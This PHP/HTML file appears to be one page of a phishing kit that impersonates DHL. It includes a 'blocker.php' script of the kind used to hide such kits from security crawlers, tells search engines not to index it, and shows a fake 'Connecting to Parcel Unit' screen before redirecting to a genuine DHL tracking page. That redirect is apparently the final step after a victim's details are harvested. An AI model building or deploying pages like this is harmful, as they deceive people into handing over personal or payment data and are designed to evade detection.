<?php
include("../blocker.php");
?>
<html hola_ext_inject="ready">
<head>
<meta name="robots" content="noindex, nofollow">
<meta name="googlebot" content="noindex, nofollow">
<link rel="shortcut icon" href="../two/favicon.gif">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="refresh" content="2;url=https://www.aftership.com/couriers/dhl?l=DHl-dTracking_=_JeHFUq_VJOXK0QWHtoGYDw=_JeHFUq_VJOXK0QWHtoGYDw=_JeHFUq_VJOXK0QWHto=" &="">
</head><body hola-ext-player="1"><p>&nbsp;
</p>
<p align="center">
<img src="../two/hl.jpg" height="106" width="475"></p>
<p align="center">Connecting to Parcel Unit</p>
<p align="center"><img src="../two/bar.gif" height="36" width="495"></p>
<p align="center">&nbsp;</p></body></html>